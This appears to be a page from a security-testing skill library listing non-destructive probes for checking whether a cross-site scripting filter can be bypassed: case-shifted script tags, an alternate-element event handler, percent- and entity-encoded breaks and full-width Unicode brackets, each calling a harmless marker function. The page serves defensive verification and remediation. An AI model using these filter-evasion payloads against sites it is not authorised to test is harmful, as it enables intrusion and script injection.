# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`cross-site-scripting-filter-and-context-bypass`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `cross-site-scripting-filter-and-context-bypass`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Canonical block baseline

**Expected differential:** the canonical payload is rejected by the filter, establishing the control the variants are measured against

```text
text=<script>kY9()</script> (canonical form, expect a filter rejection)
```

### Case and alternate-element variants

**Expected differential:** a case-shifted tag or an uncommon handler element reaches the sink where the canonical form was blocked

```text
text=<ScRiPt>kY9()</ScRiPt> (case-shift variant)
text=<details open ontoggle=kY9()> (alternate-element handler variant)
```

### Encoding-layer variants

**Expected differential:** an entity- or percent-encoded break decodes past the filter and renders at the sink

```text
text=%3Csvg onload=kY9()%3E (percent-encoded break)
text=&lt;img src=x onerror=kY9()&gt; (entity-encoded break tested at the sink)
```

### Unicode normalization variant

**Expected differential:** a full-width or compatibility character folds to a blocked one only at the rendering sink, defeating a byte-level filter

```text
text=＜svg onload=kY9()＞ (full-width angle brackets normalized at the sink)
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
